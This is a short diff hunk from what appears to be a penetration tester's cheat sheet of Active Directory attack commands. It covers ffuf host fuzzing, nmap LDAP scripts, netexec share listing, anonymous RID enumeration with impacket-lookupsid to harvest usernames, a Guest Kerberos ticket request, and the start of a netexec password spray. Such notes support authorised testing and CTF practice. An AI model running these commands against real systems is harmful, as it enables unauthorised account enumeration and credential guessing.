@@ -117,8 +117,8 @@ ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/
 
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' | grep -Ei 'dns'
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee usernames
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
+impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames
 
 (
 (nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
